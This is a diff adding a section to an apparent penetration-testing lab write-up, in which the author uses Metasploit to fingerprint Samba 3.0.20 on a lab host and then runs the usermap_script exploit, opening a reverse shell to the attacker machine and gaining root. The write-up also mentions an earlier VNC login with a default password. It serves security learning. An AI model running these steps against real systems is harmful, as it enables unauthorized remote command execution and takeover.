@@ -136,3 +136,45 @@ Here we got the password value that is `password`, lets try logging in VNC
 ![VNC Connected](screenshots/vnc.png)
 
 Here the credentials worked and we got the VNC access
+
+### Exploiting Samba smbd
+
+The service samba smb service is runnning on port 139, lets start
+
+So here I am not getting the version of samba in nmap scan, so I will first search for scanner module to get the version of the samba version and accordingly search for its exploits.
+
+Here I am using `scanner/smb/smb_version`  
+
+```bash
+
+msf6 auxiliary(scanner/smb/smb_version) > set rhosts 192.168.100.8
+rhosts => 192.168.100.8
+msf6 auxiliary(scanner/smb/smb_version) > exploit
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+[*] 192.168.100.8:445     -   Host could not be identified: Unix (Samba 3.0.20-Debian)
+[*] 192.168.100.8         - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+```
+
+So the version of smb service running on target machine is `Samba 3.0.20-Debian`
+
+Let's for exploits using this
+
+Here I got this exploit, `exploit/multi/samba/usermap_script`
+
+This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default "username map script" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands.
+
+```bash
+
+msf6 exploit(multi/samba/usermap_script) > set rhosts 192.168.100.8
+rhosts => 192.168.100.8
+msf6 exploit(multi/samba/usermap_script) > exploit
+[*] Started reverse TCP handler on 192.168.100.5:4444 
+[*] Command shell session 1 opened (192.168.100.5:4444 -> 192.168.100.8:60794) at 2025-09-18 15:50:08 -0400
+
+```
+
+Got the root shell
+
+![root shell using smb service](./screenshots/smb_root.png)
